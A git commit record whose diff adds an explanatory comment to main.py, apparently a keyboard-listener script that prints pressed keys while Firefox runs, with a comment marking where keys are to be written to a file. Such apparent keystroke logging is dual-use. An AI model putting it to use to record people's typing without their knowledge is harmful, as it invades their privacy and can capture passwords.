595f02540c492d7c97f2ec0c30333766165e2346
Omar Bassem <omarbassem889@gmail.com>
2025-04-21 16:43:39 +0200

    on_press_key explanation

--- main.py
+++ main.py
@@ -12,6 +12,7 @@ def checkStatus():
 
 def on_key_press(key):
     """ print(f'{key} is pressed') """
+    #reason that there is a check here, is to quit from the listener when firefox closes. 
     if(checkStatus()):
         #write keys to file from here
         print(f'{key} is pressed')
